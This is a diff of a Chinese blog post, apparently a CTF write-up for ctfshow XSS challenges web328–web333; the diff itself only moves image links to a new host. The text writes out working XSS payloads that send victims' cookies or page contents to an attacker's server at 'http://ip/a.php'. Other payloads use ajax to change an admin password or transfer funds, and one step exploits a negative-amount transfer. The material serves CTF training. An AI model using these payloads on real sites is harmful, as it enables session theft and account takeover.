@@ -768,55 +768,55 @@
 <p>然后信的内容还是老样子</p>
 <p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
 <h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>这题打开会发现貌似没有传xss payload的地方，但是细心的同学会发现</p>
-<p><img src="https://img-blog.csdnimg.cn/95d22da9a76543d092a55bfe6c356e87.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111644982.png"></p>
 <p>也就是说，如果我们是admin，说不定就拿到flag了，那咱们有了admin的cookie，是不是就能伪装成admin呢</p>
 <p>那么还是怎么传payload的问题，密码为啥不能是payload，注册就拿到cookie了</p>
 <p>这题body不能用了，返璞归真，用script</p>
 <p><code>&lt;script&gt;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie;&lt;/script&gt;</code></p>
-<p><img src="https://img-blog.csdnimg.cn/6c6c25f8ce1e4a6cb0eb22b106999dfe.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111644636.png"></p>
 <p>如果你很不幸x到了自己，出了多个sessionid，那么就选最后一个</p>
 <p>然后抓包，改个cookie就OK</p>
-<p><img src="https://img-blog.csdnimg.cn/079be7dd24cb40a6a951ea0c8b402c17.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111645031.png"></p>
 <h3 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h3><p>在这个例子中，admin的sessionid每次会话都会变，所以没办法使用sessionid进行登录（机器人好像设置的是上去一下就下来），那么思路就是让注入的XSS Payload自动读取本页面的带有<code>ctfshow</code>的字段并发到vps上。<br> 注册一个普通账号并登录，修改一个显示密码的地方为<code>ctfshow&#123;123456&#125;</code>，然后尝试直接在console中将这段字段读出来并发送到vps中，使用jQuery的类选择器：</p>
-<p><img src="https://img-blog.csdnimg.cn/b4479820aae947afbedefc02e3edfef9.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111645031.png"></p>
 <p>群主就根据这个东西写出来了payloa</p>
 <p><code>&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;window.location.href=&#39;http://ip/a.php?1=&#39;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
 <p>还是拿这个当作密码，就可以了。</p>
 <h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>上来先试一梭子上一题的payload，好像并没有成功。</p>
 <p>继续看这题多了个修改密码界面，那么只要让管理员修改成我们知道的密码，就能解决了</p>
 <p>x到管理员，还是得走我们的密码。先抓个包看看改密码的api</p>
-<img src="https://img-blog.csdnimg.cn/0a4879f68336444e8d986e3552783c10.png" style="zoom:67%;" />
+<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647725.png" style="zoom:67%;" />
 
 <p><code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=123&#39;;&lt;/script&gt;</code></p>
 <p>这里的由于x的是admin，所以用了admin的本地IP<code>127.0.0.1</code></p>
 <p>注册，发现并没有什么用，试试用户名，你看那用户名，很长一筐，其实之前一直没用用户名，是因为用户名只能注册一次，但是密码可以重复</p>
 <p>或者保险起见，直接用户名密码全是xss</p>
 <p>好了，admin#123 登陆成功，为了防止自动跳转，这里抓一下</p>
-<img src="https://img-blog.csdnimg.cn/d48a5d3eb1a740959464921c655482a8.png" style="zoom:67%;" />
+<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647186.png" style="zoom:67%;" />
 
 <h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>上来，先试一试上一题的payload，好吧，并没有那么幸运</p>
 <p>这里注意到url，发现并不是get了，那么猜测是post，抓包一看，果然是</p>
-<p><img src="https://img-blog.csdnimg.cn/83335aeb075740c3ad9e32239bd3c718.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111657280.png"></p>
 <p>仿照，post的源码，写个payload就好了</p>
 <img src="https://img-blog.csdnimg.cn/2374b981265e47b0937e36cfe3e3422b.png" style="zoom:67%;" />
 
 <p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;</code></p>
 <p>payload来喽，解决</p>
-<p><img src="https://img-blog.csdnimg.cn/d6eb838fe97e432dafbb2981a18f6abe.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111656980.png"></p>
 <h3 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h3><p>先试一下上一题的payload，就是说，只要拿到admin了，什么都好说，然后失败了，转换思路。</p>
 <p>这题很简单，要买flag嘛，但是钱不够，还有个转账口子</p>
 <p>尝试转负的，然后就成功了</p>
-<p><img src="https://img-blog.csdnimg.cn/7f640a54e90146fbaec3670dff798fab.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111654005.png"></p>
 <p>购买flag，成功</p>
 <p>这题也可以给自己转账，然后会发现，给自己转账是不要钱的，然后就可以一直转，只要金额少于自己的余额就行。</p>
 <p>这里就不再演示了。</p>
 <p>然后这好像跟xss没什么关系，现在x不到admin的密码了，我们试一试能不能直接x一下admin转账，我们抓包看一下转账的传参</p>
-<p><img src="https://img-blog.csdnimg.cn/efab3fff3b164a188fd162531921c071.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111654665.png"></p>
 <p>改一下上一题的payload</p>
 <p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></p>
 <p>搞定啊</p>
 <h3 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h3><p>首先试一试上一题，给自己转账是可行的，x到admin转账也是可行的。</p>
-<p><img src="https://img-blog.csdnimg.cn/635daf0f3a4f4898b3b50353c49878dc.png"></p>
+<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202207111647124.png"></p>
 <p><code>&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;</code></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>js很重要，可以通过js搞整个网页</p>
 ]]></content>
